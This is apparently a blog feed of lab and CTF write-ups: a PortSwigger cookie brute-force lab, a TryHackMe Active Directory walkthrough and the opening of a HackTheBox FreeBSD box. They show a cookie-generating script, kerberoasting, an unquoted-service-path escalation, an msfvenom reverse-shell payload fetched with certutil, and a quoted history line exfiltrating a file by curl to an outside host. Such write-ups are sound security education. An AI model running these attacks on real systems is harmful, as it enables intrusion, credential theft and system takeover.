<p>The cookie is encoded in base64. Decoding it reveals that it is composed of the our username, &ldquo;:&rdquo;, and a hash.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ echo &#39;d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw&#39; | base64 -d                                    
wiener:51dc30ddc473d43a6011e9ebba6ca770
</code></pre><p>Given that our username was used as part of the cookie, we can reasonably infer that the hash is based on a predictable value like a timestamp, password, or maybe even the username again. In this case, it&rsquo;s the MD5 hash of our password. We can confirm this by hashing our password using MD5 and verifying it is identical to the hash in our cookie.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ echo -n &#39;peter&#39; | md5sum | cut -d &#39; &#39; -f1 
51dc30ddc473d43a6011e9ebba6ca770
</code></pre><p>We have now determined that the stay-logged-in cookie is <code>username:&lt;password MD5 hash&gt;</code> and base64-encoded. Since we have already been given a <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">list of passwords</a>, we can create a list of potential cookies for <code>carlos</code> by applying these rules. I provided a script that does this and saves the cookies into <code>cookies.txt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># md5 hash -&gt; user:&lt;hash&gt; -&gt; base64 cookie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r line
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span>  -f1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        cookie<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;carlos:</span>$hash<span style="color:#e6db74">&#34;</span> | base64<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">&#34;</span> &gt;&gt; cookies.txt
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#66d9ef">$(</span>cat pass.txt<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p>Now we can brute force the stay-logged-in cookie for <code>carlos</code>. Logout and start Burp Suite. We are going to login again as <code>wiener</code> again, but this time we are going to intercept our web requests. Forward the POST request but capture the GET request for your account details.</p>
<p><img src="/img/portswigger/cookie-brute/persistent_logon.png" alt="Web request"></p>
<p>Copy it and save it into a file. Change the <code>id</code> query string&rsquo;s value to <code>carlos</code> and replace the stay-logged-in cookie with <code>FUZZ</code>. Now, we can brute force the cookie.</p>
<pre tabindex="0"><code>ffuf -request request.txt -request-proto https -mode clusterbomb -w cookies.txt:FUZZ -r
</code></pre><p>We see a change in the webserver&rsquo;s response after supplying one of the cookies.</p>
<p><img src="/img/portswigger/cookie-brute/success.png" alt="Cookie brute force"></p>
<p>Now we can simply use our cookie to take over  <code>carlos</code>. Once again, we open the developer tools and head to storage &gt; cookies. Right click and add another item with the name as &ldquo;stay-logged-in&rdquo; and the value as the cookie we got.</p>
<p><img src="/img/portswigger/cookie-brute/add_cookie.png" alt="Add carlos&rsquo; cookie"></p>
<p>Refresh the page and we are now logged in as <code>carlos</code>.</p>
<p><img src="/img/portswigger/cookie-brute/carlos_pwned.png" alt="Takeover success"></p>
<hr>
<h3 id="beyond-pwn">Beyond Pwn</h3>
<p>Note that finding the cookie for <code>carlos</code> is similar to a password dictionary attack. In this particular though, there is a IP ban for incorrect login attempts. By brute forcing the cookie instead of password, we are able to bypass the IP ban.</p>
<p>Also worth mentioning is that we can also get the <code>carlos</code> user&rsquo;s password while brute forcing his cookie.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># md5 hash -&gt; user:&lt;hash&gt; -&gt; base64 cookie &amp;&amp; cookie-password map</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r line
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span>  -f1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        cookie<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;carlos:</span>$hash<span style="color:#e6db74">&#34;</span> | base64<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">&#34;</span> &gt;&gt; cookies.txt
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">: </span>$line<span style="color:#e6db74">&#34;</span> &gt;&gt; map.txt
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#66d9ef">$(</span>cat pass.txt<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p>Once we successfully authenticate with a cookie, we can find its corresponding password through the map.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ grep &#39;Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx&#39; map.txt                    
Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx: thomas
</code></pre><p>This can be useful when checking for password reuse and may help us access more services in a real engagement.</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Enterprise</title>
      <link>http://localhost:1313/posts/enterprise/</link>
      <pubDate>Tue, 17 Sep 2024 15:11:37 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/enterprise/</guid>
      <description><![CDATA[<p><img src="/img/enterprise/enterprise.png#center" alt="Enterprise"></p>
<h3 id="description">Description</h3>
<p><a href="https://tryhackme.com/r/room/enterprise">Enterprise</a> is a Hard difficulty Active Directory box on Tryhackme. We are in an assumed compromise scenario where our only target is a domain controller on the internal network. While privilege escalation was straightforward, there are multiple rabbit holes for initial access.</p>
<h3 id="recon">Recon</h3>
<p>I began my recon on the machine was a nmap scan.</p>
<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Wed Sep 18 17:50:36 2024 as: nmap -p- -A -v -oN nmap.scan -T5 10.10.62.141
Increasing send delay for 10.10.62.141 from 0 to 5 due to 948 out of 2369 dropped probes since last increase.
Warning: 10.10.62.141 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.62.141
Host is up (0.21s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn&#39;t have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-18 18:02:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Issuer: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-17T17:46:46
| Not valid after:  2025-03-19T17:46:46
| MD5:   12f5:c3db:b128:72f4:9f89:6a26:be7a:899d
|_SHA-1: 2022:9e18:d0fb:90a4:ba39:9c9b:ef3c:504f:d485:d8ce
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-18T18:03:41+00:00
|_ssl-date: 2024-09-18T18:03:49+00:00; +50s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7990/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Log in to continue - Log in with Atlassian account
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49840/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2016 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 49s, deviation: 0s, median: 49s
| smb2-time: 
|   date: 2024-09-18T18:03:42
|_  start_date: N/A

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   75.99 ms  10.13.0.1
2   ... 3
4   204.26 ms 10.10.62.141

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 18 18:03:05 2024 -- 1 IP address (1 host up) scanned in 749.00 seconds
</code></pre><p>Even if we were not told that our target was a domain controller (per the room description), it would quickly become apparent with the discovery of DC-specific ports and services like kerberos on port 88.</p>
<p>After identifying open services, I always look for quick wins next. I Noticed SMB anonymous access was allowed and we have read permission on several shares.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ netexec smb 10.10.62.141 -u &#39;Anonymous&#39; -p &#39;&#39; --shares
SMB         10.10.62.141    445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.62.141    445    LAB-DC           [+] LAB.ENTERPRISE.THM\Anonymous: 
SMB         10.10.62.141    445    LAB-DC           [*] Enumerated shares
SMB         10.10.62.141    445    LAB-DC           Share           Permissions     Remark
SMB         10.10.62.141    445    LAB-DC           -----           -----------     ------
SMB         10.10.62.141    445    LAB-DC           ADMIN$                          Remote Admin
SMB         10.10.62.141    445    LAB-DC           C$                              Default share
SMB         10.10.62.141    445    LAB-DC           Docs            READ            
SMB         10.10.62.141    445    LAB-DC           IPC$            READ            Remote IPC
SMB         10.10.62.141    445    LAB-DC           NETLOGON                        Logon server share 
SMB         10.10.62.141    445    LAB-DC           SYSVOL                          Logon server share 
SMB         10.10.62.141    445    LAB-DC           Users           READ            Users Share. Do Not Touch!
</code></pre><p><code>Docs</code> and <code>Users</code> in particular appeared worth digging further into. I took a look at <code>Docs</code> first.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.62.141/Docs -U Anonymous -N
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Mar 15 02:47:35 2021
  ..                                  D        0  Mon Mar 15 02:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 02:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 02:45:24 2021

                15587583 blocks of size 4096. 9927627 blocks available
smb: \&gt;
</code></pre><p>There are two files, <code>RSA-Secured-Credentials.xlsx</code> and <code>RSA-Secured-Document-PII.docx</code>. These could be huge findings that allow us to breach the domain controller. I transferred the files to my attacker machine. The files were password protected, so I extracted the password hashes with <code>office2john</code> and started cracking them while I continued enumerating the machine (spoiler alert: I couldn&rsquo;t crack any of the hashes).</p>
<p>I took a look at the Users share next. After some digging, I came across a PowerShell history file for LAB_ADMIN in <code>\LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\</code>.</p>
<pre tabindex="0"><code>smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\&gt; get Consolehost_hisory.txt 
getting file \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\Consolehost_hisory.txt of size 424 as Consolehost_hisory.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ cat Consolehost_hisory.txt                                                                  
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo &#34;replication:101RepAdmin123!!&#34;&gt;private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
more payment-details.txt
curl -X POST -H &#39;Cotent-Type: ascii/text&#39; -d .\private.txt&#39; http://1.215.10.99/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
exit
</code></pre><p>We see the credentials <code>replication</code>:<code>101RepAdmin123!!</code>. I tried using the credentials. Unfortunately, it appears that the <code>replication</code> user has been deleted.</p>
<p>We can also brute force usernames by taking advantage of the KDC&rsquo;s prompt for preauthentication for valid usernames (it returns an error if given a nonexistent username). I used <a href="https://github.com/ropnop/kerbrute">kerbrute</a>.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ ~/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.62.141 --domain lab.enterprise.thm /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/18/24 - Ronnie Flathers @ropnop

2024/09/18 17:47:42 &gt;  Using KDC(s):
2024/09/18 17:47:42 &gt;   10.10.62.141:88

2024/09/18 17:47:47 &gt;  [+] VALID USERNAME:       banana@lab.enterprise.thm
2024/09/18 17:47:54 &gt;  [+] VALID USERNAME:       guest@lab.enterprise.thm
2024/09/18 17:48:20 &gt;  [+] VALID USERNAME:       administrator@lab.enterprise.thm
2024/09/18 17:49:53 &gt;  [+] VALID USERNAME:       cake@lab.enterprise.thm
2024/09/18 17:50:51 &gt;  [+] VALID USERNAME:       enterprise@lab.enterprise.thm
2024/09/18 17:51:40 &gt;  [+] VALID USERNAME:       nik@lab.enterprise.thm
2024/09/18 17:52:34 &gt;  [+] VALID USERNAME:       Guest@lab.enterprise.thm
2024/09/18 17:52:35 &gt;  [+] VALID USERNAME:       Administrator@lab.enterprise.thm
2024/09/18 17:57:00 &gt;  [+] VALID USERNAME:       Banana@lab.enterprise.thm
2024/09/18 17:57:14 &gt;  [+] VALID USERNAME:       spooks@lab.enterprise.thm
2024/09/18 17:59:28 &gt;  [+] VALID USERNAME:       joiner@lab.enterprise.thm
</code></pre><p>I then tried sprayed <code>101RepAdmin123!!</code> against the usernames and variations of it (e.g. <code>101RepAdmin123!</code>) against the users to no avail. ASREProasting also turned up nothing, so I had to look at other attack vectors.</p>
<p>There are also two HTTP services running on ports 80 and 7990 that we can take a look at. While port 80 did not yield anything interesting, there is an Atlassian portal on port 7990. The login portal itself appears to be a static and unexploitable webpage, but there is a message mentioning that the org may be moving to Github.</p>
<p><img src="/img/enterprise/atlassian.png" alt="Atlassian login portal"></p>
<p>I have to admit, it took me way longer than I would have liked to figure out that there was an actual Github page associated with &ldquo;Enterprise-THM&rdquo; as opposed to something like a .git folder hidden in a subdirectory.</p>
<p><img src="/img/enterprise/enterprise_github.png" alt="Enterprise-THM Github page"></p>
<p>The Github page has a single repository that doesn&rsquo;t hold any useful information. However, there is an associated account &ldquo;Nik-enterprise-dev&rdquo; which has a repository &ldquo;mgmtScript.ps1&rdquo;. This could prove to be out lucky break.</p>
<p><img src="/img/enterprise/nik_github.png" alt="Nik-enterprise-dev Github page"></p>
<h3 id="foothold">Foothold</h3>
<p>The PowerShell script takes in a username and password and gets the system information of all computers within an active directory network. While the <code>$userName</code> and <code>$userPassword</code> fields are empty, we can see that there has been more than one change pushed to this repository.</p>
<p><img src="/img/enterprise/git_history.png" alt="mgmtScript.ps1 Repository history"></p>
<p>We can look at the details by cloning the repository.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/Nik-enterprise-dev/mgmtScript.ps1.git
</span></span></code></pre></div><p>I then switched to the repository folder and ran <code>git log</code>. This shows, among others, the commit hash for each push to the repository. We can use these hashes to view changes and previous versions of the repo.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/mgmtScript.ps1]
└─$ git log                                                           
commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (HEAD -&gt; main, origin/main, origin/HEAD)
Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
Date:   Sat Mar 13 20:09:16 2021 -0500

    Updated things
    
    I accidentally added something

commit bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8
Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
Date:   Sat Mar 13 18:57:40 2021 -0500

    Create SystemInfo.ps1
    
    Gets System Info from each computer on the domain
</code></pre><p>In one of his commits, Nik comments that he &ldquo;accidentally added something&rdquo;. We can view the details by supplying the commit hash.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/mgmtScript.ps1]
└─$ git show c3c239df75fefbe7563d1d29c963ba1f01e4fe5a
commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (HEAD -&gt; main, origin/main, origin/HEAD)
Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
Date:   Sat Mar 13 20:09:16 2021 -0500

    Updated things
    
    I accidentally added something

diff --git a/SystemInfo.ps1 b/SystemInfo.ps1
index bc7ca27..5ae7576 100644
--- a/SystemInfo.ps1
+++ b/SystemInfo.ps1
@@ -1,6 +1,6 @@
 Import-Module ActiveDirectory
-$userName = &#39;nik&#39;
-$userPassword = &#39;&lt;nik&#39;s password&gt;&#39;
+$userName = &#39;&#39;
+$userPassword = &#39;&#39;
 $psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
 $Computers = New-Object -TypeName &#34;System.Collections.ArrayList&#34;
 $Computer = $(Get-ADComputer -Filter * | Select-Object Name)
</code></pre><p>We see that Nik had accidentally pushed his credentials and the final commit removed them from the repository. I tried <code>nik</code>:<code>&lt;nik's password&gt;</code> against a number of services, but the account does not have sufficient privileges to gain a foothold through common services like RDP or SMB. However, since it is a domain account, we can also perform other attacks such as kerberoasting.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-GetUserSPNs lab.enterprise.thm/nik:&#39;&lt;nik&#39;s password&gt;&#39; -dc-ip 10.10.62.141 -request -outputfile kerberoast.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 01:20:01.333272  2021-04-26 15:16:41.570158             



[-] CCache file is not found. Skipping...
</code></pre><p>We get a hash for <code>bitbucket</code>. Now to crack it&hellip;</p>
<pre tabindex="0"><code>hashcat -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
</code></pre><p>Eventually, it cracks.</p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>With the new credentials for the <code>bitbucket</code> service account, I connected to the domain controller through RDP.</p>
<pre tabindex="0"><code>xfreerdp /v:10.10.62.141 /u:bitbucket /p:&lt;bitbucket&#39;s password&gt; /cert-ignore
</code></pre><p>After some enumeration, I found an unquoted service path.</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;wmic service get name,pathname | findstr /i /v &#34;C:\Windows\\&#34; | findstr /i /v &#34;&#34;&#34;
Name                                      PathName                                                                      
AtlassianBitbucket                        C:\Atlassian\Bitbucket\7.11.1\bin\bserv64.exe //RS//AtlassianBitbucket        
AtlassianBitbucketElasticsearch           C:\Atlassian\Bitbucket\7.11.1\elasticsearch\bin\elasticsearch-service-x64.exe //RS//AtlassianBitbucketElasticsearch
LSM                                                                                                                     
NetSetupSvc                                                                                                             
zerotieroneservice                        C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe               
</code></pre><p>Unquoted service paths are a vulnerability that arises due to the way Windows runs its binaries. Say we have a program <code>C:\Users\Public\My Programs\New Program.exe</code>, Windows will first try to execute <code>C:\Users\Public\My.exe</code> followed by <code>C:\Users\Public\My Program.exe</code>, <code>C:\Users\Public\My Program\New.exe</code>, and finally <code>C:\Users\Public\My Programs\New Program.exe</code> because of the spaces in and the path and lack of enclosing quotes. <code>zerotieroneservice</code> is vulnerable to this type of exploit.</p>
<p>Importantly, the service binary is owned by <code>NT AUTHORITY\SYSTEM</code>.</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;dir /q &#34;C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe&#34;
 Volume in drive C has no label.
 Volume Serial Number is 7CD9-A0AE

 Directory of C:\Program Files (x86)\Zero Tier\Zero Tier One

12/05/2014  11:52 AM         9,594,056 NT AUTHORITY\SYSTEM    ZeroTier One.exe
               1 File(s)      9,594,056 bytes
               0 Dir(s)  40,566,411,264 bytes free
</code></pre><p>User permissions for <code>C:\Program Files (x86)\Zero Tier</code>:</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;icacls &#34;C:\Program Files (x86)\Zero Tier&#34;
C:\Program Files (x86)\Zero Tier BUILTIN\Users:(OI)(CI)(W)
                                 NT SERVICE\TrustedInstaller:(I)(F)
                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                 NT AUTHORITY\SYSTEM:(I)(F)
                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Administrators:(I)(F)
                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Users:(I)(RX)
                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
</code></pre><p><code>bitbucket</code>, as a member of <code>BUILTIN\Users</code>, has write access to the <code>C:\Program Files (x86)\Zero Tier</code> directory through <code>BUILTIN\Users</code>. It is therefore possible to write a &ldquo;Zero.exe&rdquo; binary have the zerotieroneservice execute it.</p>
<pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.48.55 LPORT=31337 -f exe -o Zero.exe
</code></pre><p>Now to transfer it to our target&hellip;</p>
<pre tabindex="0"><code>python3 -m http.server 80
</code></pre><pre tabindex="0"><code>C:\Program Files (x86)\Zero Tier&gt;certutil -urlcache -f http://10.13.48.55/Zero.exe Zero.exe
</code></pre><p>Next, I checked the status of <code>zerotieroneservice</code>.</p>
<pre tabindex="0"><code>C:\Program Files (x86)\Zero Tier&gt;sc query zerotieroneservice

SERVICE_NAME: zerotieroneservice
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
</code></pre><p>The service is not running. All that needs to be done now is to start the service and we should receive a shell as <code>NT AUTHORITY\SYSTEM</code> (Don&rsquo;t forget to start a listener first).</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;sc start zerotieroneservice
</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nvlp 31337
listening on [any] 31337 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.146.30] 49930
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

C:\Windows\system32&gt;
</code></pre>]]></description>
      
    </item>
    
    
    
    <item>
      <title>Poison</title>
      <link>http://localhost:1313/posts/poison/</link>
      <pubDate>Mon, 16 Sep 2024 20:59:17 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/poison/</guid>
      <description><![CDATA[<p><img src="/img/poison/poison.png#center" alt="Poison"></p>
<h3 id="description">Description</h3>
<p>Poison is a Medium difficulty FreeBSD box. Exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.</p>
<h3 id="recon">Recon</h3>
<p>We start by running a Nmap scan against the target.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -A 10.10.10.84 -T5   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 01:19 GMT
Warning: 10.10.10.84 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.84
Host is up (0.041s latency).
Not shown: 45954 filtered tcp ports (no-response), 19579 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Aggressive OS guesses: FreeBSD 11.0-RELEASE - 12.0-CURRENT (97%), FreeBSD 11.1-STABLE (97%), FreeBSD 11.2-RELEASE - 11.3 RELEASE or 11.2-STABLE (96%), FreeBSD 11.3-RELEASE (96%), FreeBSD 11.0-STABLE (95%), FreeBSD 11.1-RELEASE or 11.2-STABLE (95%), FreeBSD 11.1-RELEASE (95%), FreeBSD 11.0-CURRENT (94%), FreeBSD 11.0-RELEASE (94%), FreeBSD 12.0-RELEASE - 13.0-CURRENT (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

